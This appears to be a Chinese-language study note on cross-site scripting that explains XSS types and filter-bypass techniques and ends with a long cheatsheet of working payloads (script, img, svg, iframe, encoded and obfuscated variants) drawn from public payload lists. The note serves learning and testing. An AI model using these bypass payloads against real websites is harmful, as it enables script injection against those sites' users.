# Cross-Site Scripting  
[同源策略](https://github.com/shinmao/Web-Security-Learning/blob/master/XSS/Same-Origin%20Policy.md)    
1. reflected xss (非持久型):    
  
2. stored xss (持久型):  
Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內容  
  
3. DOM xss:   
注意: reflective型 以及 stored型 才會與server有互動，因為server需要解析惡意代碼，而DOM型則是完全由客戶端js執行。  
  
*  [XSS detection](#xss-detection)  
*  [常見限制 and 對抗手勢](#常見限制-and-對抗手勢)  
*  [正規表達式](#正規表達式)  
*  [攻擊手勢](#攻擊手勢)  
*  [Cheatsheet](#cheatsheet)    
*  [Reference](#reference)

# XSS detection
這裡先不談XSS探針...  
我習慣直接注入sciprt語句作測試，常見語句如下:  
```js
<script>alert(/1/);<script>
<a href=1 onload=alert(1)>hi</a>
```
在這裏個人認為較重要的是分析注入點對網頁產生的影響，我注入的惡意代碼沒有作用可能有兩種原因：  
1. 網頁不存在可利用的xss漏洞，可能注入點直接將值插入網頁作為內容  
2. 惡意代碼被過濾掉，或者轉譯了 -> 這種情況下就要分析有沒有代替字元來繞過過濾名單，或者繞過轉譯！

# 常見限制 and 對抗手勢
* 大小寫混用  
* toUpperCase()  
```js
İ (%c4%b0).toLowerCase() => i
ı (%c4%b1).toUpperCase() => I
ſ (%c5%bf) .toUpperCase() => S
K (%E2%84%AA).toLowerCase() => k
```
* 一次過濾繞過  
```php
str_replace('<script>','',$GET['hi'])  //這裏代表hi中的<script>會變空字串
// <scr<script>ipt> 
```  
* 使用正規表達式高效率的過濾  
```php
preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])   // 大寫小寫一次繞過全都會被擋掉
// <img src=1 onerror=alert(1)>
```
* encode 轉譯危險標籤  
  * url encode: % + ASCII(hex) ```%3Cscript%3E```  
  * [JS fucking](http://www.jsfuck.com/)  
  補充js常見處理函式: ```escape()/unescape(), encodeURL()/decodeURL(), encodeURLComponent()/decodeURLComponent()```  
  * html encode  
```php
htmlspecialchars($_GET['hi']);  // 會將特殊字元通通轉譯掉 
// 這種情況下將無法再進行注入
```
  * unicode encode: %u + ASCII(hex)  
  * ascii encode  
  ```js
  eval(String.fromCharCode(97,108,101,114,116,40,49,41))
  // <script>alert(1)</script>
  ```
  String.fromCharCode() 將unicode字碼轉換成字串 [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
  eval() 執行參數中的js語句 [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
* length limit  
  * 外部引入自己的script ```<script src=".js"></script>```  
* 未過濾\n類符號  
```js
<img src="javas
cript:
alert(/1/);">
```

# 正規表達式
js中會用正規表達式來過濾危險字符  
```js
/g -> 全局匹配
/i -> case insensitive
```
參考如下文件：  
[Documentation](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#.E9.80.9A.E8.BF.87.E5.8F.82.E6.95.B0.E8.BF.9B.E8.A1.8C.E9.AB.98.E7.BA.A7.E6.90.9C.E7.B4.A2)

# 攻擊手勢  
* script  
```js
<script>a=prompt;a(1)</script>
```
* img  
```js
<img src=1 onmouseover=alert(1)>
<img src=1 onerror=confirm(1)>
<img src="javascript:alert(1);">
```
* svg  
```js
<svg/onload=alert(1)>
```
* body  
```js
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29’;>   
// 這種payload也可以繞過括號過濾
```

# Cheatsheet
```php
</script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>         // 協議解析
</script>"><script>prompt(1)</script>
</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
"><script>al\u0065rt(document.domain)</script>
"><script>al\u{65}rt(document.domain)</script>
"><img src=x onerror=prompt(1)>
"><svg/onload=prompt(1)>
"><iframe/src=javascript:prompt(1)>
"><h1 onclick=prompt(1)>Clickme</h1>
"><a href=javascript:prompt(1)>Clickme</a>
"><a href="javascript:confirm%28 1%29">Clickme</a>
"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
"><textarea autofocus onfocus=prompt(1)>
"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
"><script>co\u006efir\u006d`1`</script>
"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>
"><img src=x onerror=co\u006efir\u006d`1`>
"><svg/onload=co\u006efir\u006d`1`>
"><iframe/src=javascript:co\u006efir\u006d%28 1%29>
"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
"><a href=javascript:prompt%28 1%29>Clickme</a>
"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
"><textarea autofocus onfocus=co\u006efir\u006d(1)>
"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
"><img/src=x%0Aonerror=prompt`1`>
"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
"><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
```
上面的cheatsheet除了有brutexss原有的payload還有一些自己蒐集的!  
[Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  

# Reference
1. The Web Application Hacker's Handbook  
2. [看雪](https://www.kanxue.com)  
3. [烏雲](http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)  
4. [云淡风轻](http://blog.idhyt.com/2014/10/15/technic-xss-bypass/)  
5. [freebuf](http://www.freebuf.com/articles/web/153055.html)  
6. [BruteXSS](https://github.com/shawarkhanethicalhacker/BruteXSS)  
7. [PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)  
